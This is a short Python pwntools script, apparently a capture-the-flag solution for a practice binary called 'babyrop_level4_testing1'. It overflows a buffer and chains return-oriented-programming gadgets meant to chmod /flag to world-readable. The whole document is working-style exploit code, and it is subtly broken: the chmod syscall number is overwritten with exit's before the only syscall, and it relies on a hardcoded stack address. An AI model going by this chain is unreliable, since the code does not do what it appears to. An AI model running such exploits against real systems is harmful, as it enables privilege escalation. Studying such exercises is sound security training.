import pwn

distance = 104
p = pwn.process("babyrop_level4_testing1")
rop = pwn.ROP(p.elf)
pop_rax = rop.find_gadget(['pop rax', 'ret'])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi = rop.find_gadget(['pop rsi','ret'])
syscall = rop.find_gadget(['syscall','ret'])
print(p.clean())
buffer_addr = 0x7ffc675ae190
p.send(
    b"/flag\0".ljust(104,b'a')+
    pwn.p64(pop_rax.address) + pwn.p64(90)+
    pwn.p64(pop_rdi.address) + pwn.p64(buffer_addr)+
    pwn.p64(pop_rsi.address) + pwn.p64(0o777) +
    
    pwn.p64(pop_rax.address) + pwn.p64(60)+
    pwn.p64(pop_rdi.address) + pwn.p64(42)+
    pwn.p64(syscall.address)
)
print(p.readall())